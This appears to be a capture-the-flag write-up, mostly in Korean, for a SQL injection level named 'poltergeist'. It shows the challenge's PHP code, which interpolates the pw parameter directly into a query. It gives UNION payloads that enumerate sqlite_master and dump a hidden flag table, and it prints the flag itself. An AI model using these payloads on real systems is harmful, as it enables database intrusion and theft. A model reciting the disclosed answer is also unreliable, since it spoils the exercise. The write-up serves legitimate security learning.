# poltergeist

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/poltergeist.db");
  $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

  if($poltergeistFlag === $_GET['pw']) solve("poltergeist");// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
  highlight_file(__FILE__);
?>
```

## 2. Condition
- get 파라미터 pw를 받는다.   
- 숨겨진 flag를 입력하면 최종적으로 문제가 해결된다.   

## 3. Solution
```
// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
```
주석을 참고하여 테이블부터 찾아보았다.   

sqlite는 mysql과 다른 방법으로 테이블을 찾아야 한다.   
바로, sqlite_master의 name을 참조하는 방법이다.   

바로 쿼리로 작성하였다.   

변수명 | 값
---|---:
`pw` | ' union select name from sqlite_master limit 0,1-- 


sqlite에는 concat함수가 없는 관계로,   
`limit`함수를 이용하여 하나하나 탐색하였다.   

결과적으로 'flag_70c81d99'와 'member' 두 테이블만 존재하는 것을 확인하였다.   





이어서, 'flag_70c81d99'속 값들을 확인하였다.   

변수명 | 값
---|---:
`pw` | ' union select * from flag_70c81d99-- 


결과는 다음과 같다.   

```
Hello FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}
```


최종적으로 위 flag를 입력해주면 문제가 해결된다.   
변수명 | 값
---|---:
`pw` | Hello FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}